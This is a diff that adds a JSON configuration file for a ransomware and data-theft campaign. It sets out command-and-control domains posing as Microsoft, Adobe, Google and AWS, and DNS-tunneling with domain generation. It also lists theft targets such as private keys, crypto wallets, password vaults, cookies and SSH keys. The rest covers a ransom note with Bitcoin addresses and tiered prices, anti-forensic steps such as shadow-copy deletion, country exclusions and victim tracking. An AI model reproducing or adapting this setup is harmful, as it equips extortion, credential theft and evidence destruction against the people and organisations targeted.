@@ -1,0 +1,132 @@
+{
+  "c2_domain": "microsoft-security-updates.com",
+  "backup_domains": [
+    "windows-critical-patches.net",
+    "adobe-security-center.org", 
+    "google-analytics-cdn.info",
+    "cloudflare-cache-node.co",
+    "amazon-aws-storage.biz"
+  ],
+  
+  "dns_servers": [
+    "1.1.1.1", "8.8.8.8", "208.67.222.222", "9.9.9.9",
+    "94.140.14.14", "76.76.76.76"
+  ],
+  
+  "communication": {
+    "method": "dns_tunneling",
+    "chunk_size": 28,
+    "poll_interval": 180,
+    "max_retries": 15,
+    "timeout": 30,
+    "jitter_percent": 25,
+    "fast_flux_enabled": true,
+    "domain_generation_algorithm": true,
+    "dga_seed": "malware_campaign_2024_v3"
+  },
+  
+  "encryption_key": "7f9a8b2c4d5e6f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a",
+  "backup_encryption_keys": [
+    "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
+    "f1e2d3c4b5a69781c2b3a4958647f3e2d1c0b9a8978665544332211ffeeddccbb"
+  ],
+  
+  "session": {
+    "id_length": 6,
+    "heartbeat_interval": 900,
+    "command_timeout": 300,
+    "keep_alive": true,
+    "session_encryption": "aes256gcm"
+  },
+  
+  "exfiltration": {
+    "enabled": true,
+    "priority": "high",
+    "max_file_size": 52428800,
+    "compression": true,
+    "compression_level": 9,
+    "chunk_upload_size": 1048576,
+    "concurrent_uploads": 3,
+    "targets": [
+      "*.key", "*.p12", "*.pfx", "*.pem", "*.crt", "*.cer",
+      "wallet.dat", "*.wallet", "electrum.dat",
+      "*password*", "*credential*", "*login*", "*auth*",
+      "*.kdbx", "*.1pif", "lastpass*", "bitwarden*",
+      "cookies.sqlite", "*.cookie", "*cookie*",
+      "*.ssh", "id_rsa", "id_dsa", "*.ppk",
+      "*.rdp", "*.vnc", "*teamviewer*",
+      "*.sql", "*.db", "*.mdb", "database*",
+      "*.txt", "*.doc", "*.docx", "*.pdf", "*.xls",
+      "desktop.ini", "*.lnk", "*.url",
+      "*backup*", "*config*", "*settings*"
+    ],
+    "exclude_patterns": [
+      "*.exe", "*.dll", "*.sys", "*.tmp", "*.log",
+      "thumbs.db", "desktop.ini", "*.lnk"
+    ]
+  },
+  
+  "ransom_note": {
+    "filename": "HOW_TO_DECRYPT_FILES.txt",
+    "desktop_wallpaper": "ransom_wallpaper.bmp",
+    "contact_emails": [
+      "datarecovery2024@protonmail.com",
+      "filesupport@tutanota.com",
+      "helpdesk@torbox3uiot6wchz.onion"
+    ],
+    "telegram_contact": "@DataRecoverySupport2024",
+    "bitcoin_addresses": [
+      "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+      "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2",
+      "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"
+    ],
+    "payment_amounts": {
+      "individual": "0.08",
+      "small_business": "0.5", 
+      "enterprise": "5.0",
+      "government": "25.0"
+    },
+    "deadline_hours": 72,
+    "price_increase_after": 48,
+    "discount_early_payment": 0.75,
+    "proof_decryption_files": 3,
+    "languages": ["en", "fr", "de", "es", "it", "ru", "zh", "ja"]
+  },
+  
+  "anti_forensics": {
+    "log_wiping": true,
+    "registry_cleaning": true,
+    "mft_timestamping": true,
+    "shadow_copy_deletion": true,
+    "recycle_bin_clearing": true,
+    "temp_file_cleaning": true,
+    "browser_history_deletion": true
+  },
+  
+  "geographical_targeting": {
+    "exclude_countries": ["RU", "BY", "KZ", "UZ", "KG", "TJ", "AM", "AZ", "GE", "MD"],
+    "priority_targets": ["US", "GB", "DE", "FR", "CA", "AU", "JP", "KR", "NL", "CH"],
+    "timezone_aware": true,
+    "currency_detection": true
+  },
+  
+  "campaign_tracking": {
+    "campaign_id": "CORP_HUNT_2024_Q2",
+    "affiliate_id": "AFF_7843",
+    "version": "3.2.1",
+    "build_date": "2024-06-15",
+    "stats_reporting": true,
+    "victim_profiling": true
+  },
+  
+  "logging": {
+    "enabled": true,
+    "level": "INFO",
+    "max_size": 10485760,
+    "encrypt_logs": true,
+    "upload_logs": true,
+    "log_victims": true,
+    "log_payments": true,
+    "log_decryptions": true
+  }
+}
